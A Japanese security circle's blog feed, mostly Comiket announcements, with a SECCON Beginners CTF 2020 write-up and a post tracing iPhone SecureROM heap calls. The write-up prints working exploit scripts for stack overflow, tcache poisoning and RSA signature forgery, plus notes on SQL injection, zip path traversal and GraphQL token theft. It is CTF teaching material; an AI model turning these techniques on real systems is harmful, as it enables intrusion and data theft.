[{"content":"C101（2022年冬コミ）に当選していました。日時・スペースは 2日目（12/31土曜日）西地区 “し” ブロック 02b です。先ほど無事入稿しましたので、（不備がなければ）新刊“urandom vol.10”を出します。\n本文サンプルは次の表紙画像リンクからどうぞ。\n\nurandom vol.10は次の内容でお送りします。\n TPM通信の観察 (by op) urandom出版システム2022 (by mayth)  本文ページ数は34p、頒布価格は500円の予定です。\n週間予報では今のところ当日の東京は晴れ時々曇りの予報となっています。寒さ対策を十分にして、気を付けてお越しください。\n","date":"2022-12-24","permalink":"https://urandom.team/post/comiket101/","tags":["Publication"],"title":"C101 参加のお知らせ"},{"content":"C100（2022年夏コミ）に当選しました。日時・スペースは 1日目（8/13土曜日）西地区 “せ” ブロック 08a です。新刊“urandom vol.9”を出します。 （前回のC99参加の際には前日まで印刷作業をしていて告知などをする余裕がありませんでした😇 今回はそれよりは余裕のある作成となりこうしてお知らせが出せています）\n次の画像をクリックすると本文サンプルが見えます。\n\nurandom vol.9は次のような内容になります。\n Quantum Covert Lottery meets Grover\u0026rsquo;s algorithm（by yyu） とあるRISC-VのVoltage Fault Injection(C100 版)1（by op）  本文ページ数は44pとなっており、頒布価格は500円の予定です。\nC99からサークル参加人数が2名となった関係で、残念ですがyyuは会場にいません🥹\n  C99で配布したurandom vol.8に収録された記事の加筆・修正版です。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2022-08-07","permalink":"https://urandom.team/post/c100-announce/","tags":["Publication"],"title":"C100参加と新刊のお知らせ"},{"content":"  2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催されたSECCON Beginners CTF 2020のwrite-upです。\nなお、今回は以下のメンバー編成で参加しました。\n yuscarlet mayth yyu favcastle  Pwn Beginner\u0026rsquo;s Stack  Let\u0026rsquo;s learn how to abuse stack overflow!\n 64bit ELFのバイナリが与えられる。これがサーバーで動いている。\n実行すると\n Your goal is to call `win` function (located at 0x400861) [ Address ] [ Stack ] +--------------------+ 0x00007ffeb1443ac0 | 0x00007f30a003dfc8 | \u0026lt;-- buf +--------------------+ 0x00007ffeb1443ac8 | 0x0000000000400ad0 | +--------------------+ 0x00007ffeb1443ad0 | 0x0000000000400ad0 | +--------------------+ 0x00007ffeb1443ad8 | 0x00007f30a0078190 | +--------------------+ 0x00007ffeb1443ae0 | 0x00007ffeb1443af0 | \u0026lt;-- saved rbp (vuln) +--------------------+ 0x00007ffeb1443ae8 | 0x000000000040084e | \u0026lt;-- return address (vuln) +--------------------+ 0x00007ffeb1443af0 | 0x0000000000000000 | \u0026lt;-- saved rbp (main) +--------------------+ 0x00007ffeb1443af8 | 0x00007f309fe740b3 | \u0026lt;-- return address (main) +--------------------+ 0x00007ffeb1443b00 | 0x0000000100000001 | +--------------------+ 0x00007ffeb1443b08 | 0x00007ffeb1443be8 | +--------------------+   といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的のwin関数では、system(\u0026quot;/bin/sh\u0026quot;)を呼び出してくれる。つまりwin関数を呼べれば自動的にシェルが取れる。\nさて、IDAで実行ファイルを見てみると、vulnという関数で入力を受け付けてbufに格納していることがわかる。このとき、bufは0x20(32)byteしかない一方で、read関数を呼ぶときに入力サイズを0x200に設定していて、ここでスタックオーバーフローが発生する。これを使って\u0026quot;return address (vuln)\u0026ldquo;となっている箇所を書き換えればよい。飛び先となるwin関数のアドレスは分かっているし、\u0026ldquo;return address\u0026quot;までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。\n$ perl -e 'print \u0026quot;A\u0026quot;x40 . \u0026quot;\\x61\\x08\\x40\u0026quot;' | ./chall  これは失敗する。\n Oops! RSP is misaligned! Some functions such as `system` use `movaps` instructions in libc-2.27 and later. This instruction fails when RSP is not a multiple of 0x10. Find a way to align RSP! You're almost there!   というわけで、rsp（スタックポインタ）が0x10の倍数になっていないといけない。スタックポインタは8byteずつ動くので、push/popが呼び出される回数を1回増やすか減らすかする。\nwin関数があるという0x400861だが、これは関数の先頭、すなわちpush rbpを指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。push rbpの直後の0x400862を書き込むようにする。\n$ perl -e 'print \u0026quot;A\u0026quot;x40 . \u0026quot;\\x62\\x08\\x40\u0026quot;' | ./chall ... Congratulations!  祝福されたものの即座に終了してしまう。試しにncで実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によってstraceをしてみると、どうもsystem(\u0026quot;/bin/sh\u0026quot;)は呼べているがttyが取れなくて死んでいるようだった。\nどうしたものか悩んだところで、そういえばpwntoolsにinteractiveとかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。\nfrom pwn import * context.arch = 'amd64' io = process('chall') vuln_ret = pack(0x400862) io.sendline(b'A' * 40 + vuln_ret) io.interactive()  これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグをcatした。\nBeginner\u0026rsquo;s Heap この問題を解くにあたってはこちらの記事が大変参考になった: t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき\nさて、こちらはバイナリがない。ncで問題サーバーに繋ぐとこんな表示が現れる。\n Let's learn heap overflow today You have a chunk which is vulnerable to Heap Overflow (chunk A) A = malloc(0x18); Also you can allocate and free a chunk which doesn't have overflow (chunk B) You have the following important information: \u0026lt;__free_hook\u0026gt;: 0x7fe9b33978e8 \u0026lt;win\u0026gt;: 0x56491d3be465 Call \u0026lt;win\u0026gt; function and you'll get the flag. 1. read(0, A, 0x80); 2. B = malloc(0x18); read(0, B, 0x18); 3. free(B); B = NULL; 4. Describe heap 5. Describe tcache (for size 0x20) 6. Currently available hint   この対話環境を操作し、ヒープオーバーフローを使ってwin関数を呼び出すのが目標となる。なお、__free_hookとwin関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では__free_hookだとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。\nAは0x18byteしかない一方で、1の操作で0x80byteまで書くことができる。Bにはオーバーフローの脆弱性はないが、2の操作でmallocして書き込み、3の操作でfreeができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。\n何はともあれヒントを見てみる。\n Tcache manages freed chunks in linked lists by size. Every list can keep up to 7 chunks. A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk. Let's check what happens when you overwrite fd by Heap Overflow.   まず2でBをmallocして適当な値を書き込み、3でfreeする。この時点で4/5を実行すると次のような状態であることがわかる。\n -=-=-=-=-= HEAP LAYOUT =-=-=-=-=- [+] A = 0x558bbf3eb330 [+] B = (nil) +--------------------+ 0x0000558bbf3eb320 | 0x0000000000000000 | +--------------------+ 0x0000558bbf3eb328 | 0x0000000000000021 | +--------------------+ 0x0000558bbf3eb330 | 0x0000000000000000 | \u0026lt;-- A +--------------------+ 0x0000558bbf3eb338 | 0x0000000000000000 | +--------------------+ 0x0000558bbf3eb340 | 0x0000000000000000 | +--------------------+ 0x0000558bbf3eb348 | 0x0000000000000021 | +--------------------+ 0x0000558bbf3eb350 | 0x0000000000000000 | +--------------------+ 0x0000558bbf3eb358 | 0x0000000000000000 | +--------------------+ 0x0000558bbf3eb360 | 0x0000000000000000 | +--------------------+ 0x0000558bbf3eb368 | 0x0000000000020ca1 | +--------------------+ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-    -=-=-=-=-= TCACHE -=-=-=-=-= [ tcache (for 0x20) ] || \\/ [ 0x0000558bbf3eb350(rw-) ] || \\/ [ END OF TCACHE ] -=-=-=-=-=-=-=-=-=-=-=-=-=-=   ヒントにあったfdが0x0000558bbf3eb350（元々Bがあった場所）になっている。 この状態でmallocを行うと確保されたアドレスとして0x0000558bbf3eb350が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域はAのヒープオーバーフローによって書き換えられる。とりあえず目標の0x0000558bbf3eb350を__free_hookのアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。\np.sendline(b'X' * 0x20 + p64(free_hook_addr))  これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。\n It seems __free_hook is successfully linked to tcache! But the chunk size is broken or too big maybe...?    -=-=-=-=-= TCACHE -=-=-=-=-= [ tcache (for 0x20) ] || \\/ [ 0x0000556bb204b350(rw-) ] || \\/ [ 0x00007fe2b3efe8e8(rw-) ] || \\/ [ END OF TCACHE ] -=-=-=-=-=-=-=-=-=-=-=-=-=-=   fdの直前8byteがチャンクサイズなのだが、先ほどの入力では0x5858585858585858になっている。これを適当に0x20にするとヒントが変わる。\np.sendlineafter(\u0026quot;\u0026gt; \u0026quot;, '1') p.sendline(b'X' * 0x18 + p64(0x20) + p64(free_hook_addr))   It seems __free_hook is successfully linked to tcache! But you can't get __free_hook since you can only malloc/free B. What if you change the chunk size to a value other than 0x20...?   あまりに大きすぎると先ほどのように壊れていると言われるので、0x30にすると次の段階になった。\n It seems __free_hook is successfully linked to tcache! And the chunk size is properly forged!   ここでもう一度Bのmallocと書き込みを行う。ここで書き込む内容はなんでもよい。\np.sendlineafter(\u0026quot;\u0026gt; \u0026quot;, '2') p.sendline(b'X' * 0x10)  この段階でのヒントはこんな感じ。\n It seems __free_hook is successfully linked to tcache! The first link of tcache is __free_hook! But B is not empty...   Bをfreeして空にしてみる。\n It seems __free_hook is successfully linked to tcache! The first link of tcache is __free_hook! Also B is empty! You know what to do, right?   ここでtcacheの状態を見てみると、Bをfreeしたのにここに追加されておらず、__free_hookのアドレスだけが残っていることがわかる。\n -=-=-=-=-= TCACHE -=-=-=-=-= [ tcache (for 0x20) ] || \\/ [ 0x00007fc20362c8e8(rw-) ] || \\/ [ END OF TCACHE ] -=-=-=-=-=-=-=-=-=-=-=-=-=-=   最初のヒントには以下の記載があった。\n Tcache manages freed chunks in linked lists by size.   また、冒頭に挙げた記事にも次の記載がある。\n 定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, \u0026hellip;, 0x408バイト以下というように区切られています。\n つまり、先ほどチャンクサイズを0x30ということにしたため、今mallocしてfreeしたBはtcacheの別のリストに追加された、ということだと思う（たぶん）。\nさて、この状態になると次のmallocでは__free_hookのアドレスが返ってくる。__free_hookはfreeしたときに呼び出される関数へのポインタである。したがって、今mallocして返ってきた領域にwin関数のアドレスを書き込んでfreeを呼ぶと、代わりにwin関数が呼び出される。最後に出力を表示するのを忘れずに。\np.sendlineafter('\u0026gt; ', '2') p.sendline(pack(win_addr)) p.sendlineafter('\u0026gt; ', '3') log.info(p.recvline_contains(\u0026quot;ctf4b\u0026quot;))  Crypto R\u0026amp;B 先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。\nNoisy equations 下記のPythonプログラムが動いている。\nfrom os import getenv from time import time from random import getrandbits, seed FLAG = getenv(\u0026quot;FLAG\u0026quot;).encode() SEED = getenv(\u0026quot;SEED\u0026quot;).encode() L = 256 N = len(FLAG) def dot(A, B): assert len(A) == len(B) return sum([a * b for a, b in zip(A, B)]) coeffs = [[getrandbits(L) for _ in range(N)] for _ in range(N)] seed(SEED) answers = [dot(coeff, FLAG) + getrandbits(L) for coeff in coeffs] print(coeffs) print(answers)  この変数FLAGの内容を知ることができればOKという問題。 answersが表示されているが、これには乱数getrandbits(L)が加算されているので、 2回分のデータを使っていくという方法がある。 いま1回目の結果得られたcoeffsを\\(C_1\\)、そして2回目を\\(C_2\\)とすると、 これらは次のような行列である。\n$$ \\begin{align*} C_1 \u0026amp;= \\left[ \\begin{array}{cccc} c^1_{1,1} \u0026amp; c^1_{1,2} \u0026amp; \\dots \u0026amp; c^1_{1,44} \\\\\\ \\vdots \u0026amp; \\ddots \u0026amp; \u0026amp; \\vdots \\\\\\ \\vdots \u0026amp; \u0026amp; \\ddots \u0026amp; \\vdots \\\\\\ c^1_{44,1} \u0026amp; c^1_{44,2} \u0026amp; \\dots \u0026amp; c^1{44,44} \\end{array} \\right] \\\\\\ \\\\\\ C_2 \u0026amp;= \\left[ \\begin{array}{cccc} c^2_{1,1} \u0026amp; c^2_{1,2} \u0026amp; \\dots \u0026amp; c^2_{1,44} \\\\\\ \\vdots \u0026amp; \\ddots \u0026amp; \u0026amp; \\vdots \\\\\\ \\vdots \u0026amp; \u0026amp; \\ddots \u0026amp; \\vdots \\\\\\ c^2_{44,1} \u0026amp; c^2_{44,2} \u0026amp; \\dots \u0026amp; c^2_{44,44} \\end{array} \\right] \\end{align*} $$\nそしてanswerは1回目を\\(A_1\\)、そして2回目を\\(A_2\\)とすると次のようになる。\n$$ \\begin{align*} A_1 \u0026amp;= \\left[ \\begin{array}{c} a^1_{1} \\\\\\ \\vdots \\\\\\ a^1_{44} \\end{array} \\right] \\\\\\ \\\\\\ A_2 \u0026amp;= \\left[ \\begin{array}{c} a^2_{1} \\\\\\ \\vdots \\\\\\ a^2_{44} \\end{array} \\right] \\end{align*} $$\nここで\\(a^1_{i} - a^2_{i}\\)について考える。求めたいFLAGの1文字目から\\(x_1, \\dots, x_{44}\\)とすると、\n$$ a^1_{i} = \\left(\\sum^{44}_{j=1}{C^1_{i,j} \\times x_j}\\right) + R_i $$\nであり、この\\(R_i\\)はgetrandbits(L)だがPythonプログラムを見ると、シードを固定しているため、 どんな値なのかよく分からないが毎回同じ結果になる。 したがって、\\(a^1_{i} - a^2_{i}\\)は次のように\\(R_i\\)がキャンセルされる。\n$$ a^1_{i} - a^2_{i} = \\left(\\sum^{44}_{j=1}{C^1_{i,j} \\times x_j}\\right) - \\left(\\sum^{44}_{j=1}{C^2_{i,j} \\times x_j}\\right) $$\nしたがってこれを行列表現すると\n$$ \\left[ \\begin{array}{c} a^1_{1} - a^2_{1} \\\\\\ \\vdots \\\\\\ a^1_{44} - a^2_{44} \\end{array} \\right] = \\left[ \\begin{array}{cccc} c^1_{1,1} - c^2_{1,1} \u0026amp; c^1_{1,2} - c^2_{1,2} \u0026amp; \\dots \u0026amp; c^1_{1,44} - c^2_{1,44} \\\\\\ \\vdots \u0026amp; \\ddots \u0026amp; \u0026amp; \\vdots \\\\\\ \\vdots \u0026amp; \u0026amp; \\ddots \u0026amp; \\vdots \\\\\\ c^1_{44,1} - c^2_{44,1} \u0026amp; c^1_{44,2} - c^2_{44,2} \u0026amp; \\dots \u0026amp; c^1_{44,44} - c^2_{44,44} \\end{array} \\right] \\left[ \\begin{array}{c} x_{1} \\\\\\ \\vdots \\\\\\ x_{44} \\end{array} \\right] $$\nしたがってあとは\\(C_1 - C_2\\)の逆行列からFLAGを得られる。\nimport os import json import numpy as np from numpy.linalg import inv stream = os.popen(\u0026quot;nc noisy-equations.quals.beginners.seccon.jp 3000\u0026quot;) coeffs1 = json.loads(stream.readline()) answer1 = json.loads(stream.readline()) stream2 = os.popen(\u0026quot;nc noisy-equations.quals.beginners.seccon.jp 3000\u0026quot;) coeffs2 = json.loads(stream2.readline()) answer2 = json.loads(stream2.readline()) coeff_diffs =np.matrix( [ [ c1 - c2 for (c1, c2) in zip(c1s, c2s) ] for (c1s, c2s) in zip(coeffs1, coeffs2) ], dtype = 'float' ) answer_diffs = np.transpose( np.matrix( [ a1 - a2 for (a1, a2) in zip(answer1, answer2) ], dtype = 'float' ) ) coeff_diffs_inv = inv( np.matrix(coeff_diffs, dtype = 'float') ) flag = np.transpose(np.linalg.solve(coeff_diffs, answer_diffs)) flag_int = np.around(flag).astype(int).tolist()[0] print(flag) print( \u0026quot;\u0026quot;.join([ chr(i) for i in flag_int ]) )  RSA Calc 下記のようなプログラムが動いている。\nfrom Crypto.Util.number import * from params import p, q, flag import binascii import sys import signal N = p * q e = 65537 d = inverse(e, (p-1)*(q-1)) def input(prompt=''): sys.stdout.write(prompt) sys.stdout.flush() return sys.stdin.buffer.readline().strip() def menu(): sys.stdout.write('''---------- 1) Sign 2) Exec 3) Exit ''') try: sys.stdout.write('\u0026gt; ') sys.stdout.flush() return int(sys.stdin.readline().strip()) except: return 3 def cmd_sign(): data = input('data\u0026gt; ') if len(data) \u0026gt; 256: sys.stdout.write('Too long\\n') return if b'F' in data or b'1337' in data: sys.stdout.write('Error\\n') return signature = pow(bytes_to_long(data), d, N) sys.stdout.write('Signature: {}\\n'.format(binascii.hexlify(long_to_bytes(signature)).decode())) def cmd_exec(): data = input('data\u0026gt; ') signature = int(input('signature\u0026gt; '), 16) if signature \u0026lt; 0 or signature \u0026gt;= N: sys.stdout.write('Invalid signature\\n') return check = long_to_bytes(pow(signature, e, N)) if data != check: sys.stdout.write('Invalid signature\\n') return chunks = data.split(b',') stack = [] for c in chunks: if c == b'+': stack.append(stack.pop() + stack.pop()) elif c == b'-': stack.append(stack.pop() - stack.pop()) elif c == b'*': stack.append(stack.pop() * stack.pop()) elif c == b'/': stack.append(stack.pop() / stack.pop()) elif c == b'F': val = stack.pop() if val == 1337: sys.stdout.write(flag + '\\n') else: stack.append(int(c)) sys.stdout.write('Answer: {}\\n'.format(int(stack.pop()))) def main(): sys.stdout.write('N: {}\\n'.format(N)) while True: try: command = menu() if command == 1: cmd_sign() if command == 2: cmd_exec() elif command == 3: break except: sys.stdout.write('Error\\n') break if __name__ == '__main__': signal.alarm(60) main()  Fまたは1337を含まないならば、任意の文字列に署名してくれる。そしてスタック署名されたスタックマシンの命令列を実行し、狙ったところに入れる（そのためにFや1337が必要）ことができればフラグが入手できる。 RSAの準同型性を利用した。端的にいうと、いまRSAのパラメーターとして\\(N, e, d\\)と、任意の平文\\(m_1, m_2\\)があるとして、RSAは次がなりたつ。\n$$ \\text{Sign}_{d, N}(m_1 \\times m_2) \\equiv \\text{Sign}_{d, N}(m_1) \\times \\text{Sign}_{d, N}(m_2) \\bmod N $$\nよって次のようなプランでアタックする。\n \\(2\\)に署名させる \\(\\frac{\\mathtt{1337,F}}{2}\\)した値に署名させる  偶然1337,Fの数値表現は\\(2\\)で割り切ることができた   上記2つの署名をかけ算して\\(N\\)で割った余りをとる  これが1337,Fの署名となっている   1337,Fを実行し、署名として（3）で得られたものを入れる  これをやるのが下記のプログラムである。\nimport numpy as np import re import socket from Crypto.Util.number import * s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((\u0026quot;rsacalc.quals.beginners.seccon.jp\u0026quot;, 10001)) data = s.recv(4096).decode(\u0026quot;utf-8\u0026quot;) data_n = re.search('N: (\\d+)\\n', data).group(1) N = int(data_n) print(\u0026quot;N: \u0026quot; + str(N)) command = bytes_to_long(b'1337,F') half_command = int(command / 2) print(\u0026quot;command: \u0026quot; + str(command)) # Get `2` signature s.sendall(b'1\\n') print(s.recv(1024).decode(\u0026quot;utf-8\u0026quot;)) s.sendall(b'\\02\\n') signature_2 = int( re.search('Signature: ([\\da-f]+)', s.recv(4096).decode(\u0026quot;utf-8\u0026quot;)).group(1), 16 ) print(\u0026quot;signature_2: \u0026quot; + str(signature_2)) # Get `half_command` signature s.sendall(b'1\\n') print(s.recv(1024).decode(\u0026quot;utf-8\u0026quot;)) s.sendall( half_command.to_bytes((half_command.bit_length() + 7) , byteorder='big', signed=False) + b'\\n' ) signature_half_command = int( re.search('Signature: ([\\da-f]+)', s.recv(4096).decode(\u0026quot;utf-8\u0026quot;)).group(1), 16 ) print(\u0026quot;signature half command: \u0026quot; + str(signature_half_command)) # Calculate signature signature_command = signature_half_command * signature_2 % N print(\u0026quot;GOOOOOOOOOOOOOOOOOO\u0026quot;) # Execute command s.sendall(b'2\\n') print(s.recv(1024).decode(\u0026quot;utf-8\u0026quot;)) s.sendall(b'1337,F\\n') print(s.recv(1024).decode(\u0026quot;utf-8\u0026quot;)) sig = (format(signature_command, 'x')).encode(\u0026quot;ascii\u0026quot;) s.sendall(sig + b'\\n\\n') print(s.recv(2024).decode(\u0026quot;utf-8\u0026quot;))  Web Spy ユーザの有無でサーバの応答時間が変わるので、全ユーザー試して列挙。\nTweetstore SQLインジェクションでユーザ情報を表示する。\nunzip 解凍後に../../../../../../../../../flag.txtを展開するzipをアップロード。\nprofiler Burp Suiteで通信を覗くと、APIでGraphQLが使われていることがわかる。 AltairというChrome拡張機能でGraphQLのクエリを送ることができる。 利用できそうなAPIを探すと、他の人のprofileが覗けそうなsomeoneとトークンをアップデートできそうなupdateTokenが見つかる。 someoneでuid:adminを指定してリクエストすると、adminのTokenが参照できる。 ここで手に入れた値をupdateTokenで指定すると、自分のTokenがadminと同じトークンに変更できる。 この状態でflagページにアクセスすると、flagが表示される。\nReversing mask Ghidraに食わせると、flagの各文字を\u0026amp; 0x75した文字列と\u0026amp; 0xebした文字列が見つかるので、これらの論理和を計算。\nyakisoba Ghidraに食わせると、flagの各文字を判定する関数が見つかるので、読む。\nghost 実装が与えられているので、総当たり。\nMisc Welcome Discordを見る。\nemoemoencode 絵文字の文字コードの下2桁をasciiにする。\nreadme /proc/self/environでpwdが/home/ctf/serverとわかるので、/proc/self/cwd/../flagを渡し、相対パスでアクセス。\n","date":"2020-05-24","permalink":"https://urandom.team/post/seccon-beginners-ctf-2020/","tags":["CTF","Write-ups","SECCON"],"title":"SECCON Beginners CTF 2020 Write-up"},{"content":"概要 axi0mX氏のcheckm8公開により、広く一般にSecureROM(iPhone/iPadのブートローダー)の動的解析が可能になった。SecureROMのヒープレイアウトへの理解を深める為にヒープ関連処理を解析し、その一環としてSecureROM開始時からDFUモード起動完了までの間に発生するmalloc/freeの呼び出しをデバッガーで追跡したので、研究用として記事に残す。\nC97でもこの記事のコピ本を頒布予定(火曜日 南地区 リ-04b)で、間に合えば細かい話を加筆する。\n関連記事 checkm8の解説ではa1exdandy氏による次の記事が非常によくまとまっている。\nTechnical analysis of the checkm8 exploit\n上の記事でもヒープの確保シーケンスについて静的解析に基づいた解説があるが、この記事の動的解析でも上の記事と近い結果が得られた。\n検証環境  iPhone 7 (A1779) Bonobo JTAG/SWD Debug Cable ipwndfu  Matthew Pierson氏によるfork版 commit bb3c1d618f96ce96956089823f396b777b4c46acに一部変更を加えたもの    調査手順 checkm8(ipwndfu)を使用してiPhone 7(ターゲット)からSecureROMを読み出しGhidraで解析した。解析によりいわゆるmalloc, free, memalignと思われる3関数のアドレスを特定した。\nipwndfuを使用してターゲットのSWDを有効化(demote)し、Bonobo JTAG/SWD Debug Cableを使用してgdbでターゲットにアタッチした。\nSecureROM開始直後から実行を追跡するにはターゲットをリセットする必要があるが、通常の手順でターゲットをリセットすると、リセットによりdemotionの状態が初期化されてSWDが無効になり追跡できなくなる。このため、今回はdemote後にターゲットをreset vectorへジャンプさせてもう一度最初から起動処理を行わせて追跡した。Reset vectorへのジャンプ前に予めmalloc, free, memalignへハードウェアブレークポイントを張っておいて、それぞれへの呼び出しを監視・記録した。\n追跡結果 備考 この章では、iPhone 7の実機から読みだした情報を引用する。この章で引用するメモリダンプのベースはDFUモード起動完了直後のもので、ベースは0x180000000である。\n一覧 次の書式でalloc, free, memalignの呼び出しの遷移を記す。\n呼び出し元アドレス : 関数名(引数) =\u0026gt; 返り値\n000000010000f858 : free(0x00000001801b4080) 000000010000edd0 : alloc(48) =\u0026gt; 0x00000001801b4080 000000010000ede0 : alloc(256) =\u0026gt; 0x00000001801b4100 0000000100011548 : alloc(4000) =\u0026gt; 0x00000001801b4240 00000001000115d0 : free(0x00000001801b4240) 000000010000f124 : alloc(512) =\u0026gt; 0x00000001801b4240 000000010000d10c : alloc(234) =\u0026gt; 0x00000001801b4480 000000010000d10c : alloc(22) =\u0026gt; 0x00000001801b45c0 000000010000d10c : alloc(62) =\u0026gt; 0x00000001801b4640 000000010000d10c : alloc(198) =\u0026gt; 0x00000001801b46c0 000000010000d10c : alloc(62) =\u0026gt; 0x00000001801b4800 000000010000a9e0 : alloc(960) =\u0026gt; 0x00000001801b4880 000000010000a9f0 : alloc(16384) =\u0026gt; 0x00000001801b4c80 000000010000df08 : memalign(2048, 0x00000040) =\u0026gt; 0x00000001801b8d00 000000010000d2a4 : alloc(25) =\u0026gt; 0x00000001801b9540 000000010000d2b4 : alloc(25) =\u0026gt; 0x00000001801b95c0  メモ 000000010000f858 : free(0x00000001801b4080) このfreeは不要領域の解放のためではなく、ヒープの初期化時に使用可能な領域をリストに登録するためのもの。\nヒープのベースは0x1801b4000で、空ブロック1つ(長さ0x40)と、追加しようとしているブロック自身のメタデータ(長さ0x40)が先行して配置されるため、ベース + 0x80が追加する領域の（データ部分の）オフセットになる。空ブロックは後方にも配置される。\n000000010000edd0 : alloc(48) =\u0026gt; 0x00000001801b4080 役割不明のバッファー。\n000000010000ede0 : alloc(256) =\u0026gt; 0x00000001801b4100 役割不明のバッファー。\n0000000100011548 : alloc(4000) =\u0026gt; 0x00000001801b4240 役割不明のバッファー。\n00000001000115d0 : free(0x00000001801b4240) 直前で確保した長さ4000のバッファーを解放。\n000000010000f124 : alloc(512) =\u0026gt; 0x00000001801b4240 役割不明のバッファー。\nメモリの内容を確認すると、先頭に”host bridge”とのASCII文字列が書き込まれている。\n001b4240 68 6f 73 74 20 62 72 69 64 67 65 00 00 00 00 00 |host bridge.....| 001b4250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| * 001b4310 0c 16 00 00 01 00 00 00 6c 16 00 00 01 00 00 00 |........l.......| 001b4320 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 |................| 001b4330 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 |................| 001b4340 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| * 001b4440  000000010000d10c : alloc(234) =\u0026gt; 0x00000001801b4480 USBのString Descriptor (Descriptor Index = 1)\nApNonceとSEPNonceをHostに通知するためのもの。ASCII文字による16進表記かつ1文字あたり2バイトで表現するのでApNonceとSEPNonceの情報量に比してサイズが大きい。\nこれ以降の追跡結果はa1exdandy氏の記事の解析結果と概ね一致する。\n000000010000d10c : alloc(22) =\u0026gt; 0x00000001801b45c0 USBのString Descriptor (Manufacturer)\n000000010000d10c : alloc(62) =\u0026gt; 0x00000001801b4640 USBのString Descriptor (Product)\n000000010000d10c : alloc(198) =\u0026gt; 0x00000001801b46c0 USBのString Descriptor (Serial Number)\nDFUモードではここにハードウェアとソフトウェアのバージョンや設定情報を詰め込むので長い。\n000000010000d10c : alloc(62) =\u0026gt; 0x00000001801b4800 USBのString Descriptor (Configuration)\n000000010000a9e0 : alloc(960) =\u0026gt; 0x00000001801b4880 USBコントローラーを制御するタスクのタスク構造体。\n000000010000a9f0 : alloc(16384) =\u0026gt; 0x00000001801b4c80 USBコントローラーを制御するタスクのタスクスタック。\nここの確保サイズはa1exdandy氏の記事と異なる。a1exdandy氏の記事では確保サイズが0x1000となっているのに対して、今回実機で確認できた確保サイズは0x4000(16384)だった。呼び出し箇所の周辺を調べるとmax(0x1000, 0x4000)の比較結果を確保サイズとしていた。\n000000010000df08 : memalign(2048, 0x00000040) =\u0026gt; 0x00000001801b8d00 USBの入出力用バッファー。\n000000010000d2a4 : alloc(25) =\u0026gt; 0x00000001801b9540 USBのConfiguration Descriptor\na1exdandy氏の記事によればこちらがHigh-Speed用のdescriptorとのこと。書き込まれるデータは後述のFull-Speed用descriptorと同一。\nipwndfu/src/checkm8_arm64.S内のgUSBDescriptorsは、ここで確保されたバッファーへのポインターを指す。\n00088a30 40 95 1b 80 01 00 00 00 c0 95 1b 80 01 00 00 00 |@...............|  000000010000d2b4 : alloc(25) =\u0026gt; 0x00000001801b95c0 USBのConfiguration Descriptor\na1exdandy氏の記事によればこちらがFull-Speed用のdescriptorとのこと。\n備考 今回はreset vectorにジャンプすることでwarm reset(的な操作)を施してSecureROMを開始直後から追跡したが、warm reset時の状態は通常起動時と異なるため、通常起動時と挙動が一致するかどうかは不明。ただし、warm reset後でもcheckm8が成功することは確認できた。\n編集履歴 2019/12/31 USB関連の記述に誤りがあったため訂正した。\n","date":"2019-12-29","permalink":"https://urandom.team/post/tracing-securerom-malloc-free/","tags":["tech","Misc"],"title":"SecureROMのmalloc/free追跡"},{"content":"C95（2018年冬コミ）に当選してました。 スペースは 2日目 東6 ト44b です。 新刊“urandom vol.7”を出します。\n次の画像をクリックすると本文サンプルが見えます。\n\nurandom vol.7は次の内容になります。\n SECCON2018 国際大会決勝参戦記 (by urandom) 展開署名: Folding Signatureの進捗 (by yyu)  ページ数は本文30pとなっております。頒布価格は300円の予定です。\nそれでは会場でお会いしましょう。\n","date":"2018-12-25","permalink":"https://urandom.team/post/c95-announce/","tags":["Publication"],"title":"C95参加と新刊のお知らせ"},{"content":"C94（2018年夏コミ）に当選してました。 スペースは 1日目 西1 む39b です。 新刊“urandom vol.6”を出します。\n次の画像をクリックすると本文サンプルが見えます。\n\nurandom vol.6は次の内容になります。\n IoT機器のFW解析 -CBCTF2018予選問題 Odin解説- (by op) 素因数分解ゲーム (by yyu)  ページ数は本文34pとなっております。頒布価格は300円の予定です。\nそれでは会場でお会いしましょう。\n","date":"2018-08-05","permalink":"https://urandom.team/post/c94-announce/","tags":["Publication"],"title":"C94参加と新刊のお知らせ"},{"content":"C93（2017年冬コミ）に当選してました。 スペースは 1日目 東キ47a です1。 新刊“urandom vol.5”を出します。\n次の画像をクリックすると本文サンプルが見えます。\n\nurandom vol.5は次のような内容になります。\n CBCTF2017問題解説 - One of Three Billion (by op) Bitcoinによる公平なCTF (by yyu)  ページ数は本文34pとなっております。頒布価格は300円の予定です。\nそれでは会場でお会いしましょう。\n  これまでは3日目でしたが、今回から1日目となりましたのでご注意ください。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2017-12-25","permalink":"https://urandom.team/post/c93-announce/","tags":["Publication"],"title":"C93参加と新刊のお知らせ"},{"content":"C92（2017年夏コミ）に当選してました。 スペースは 3日目 東イ-60b です。 新刊“urandom vol.4”と既刊“urandom vol.3”を出します。\n\nurandom vol.4は次のような内容になります。\n mitmproxy入門 (by op) 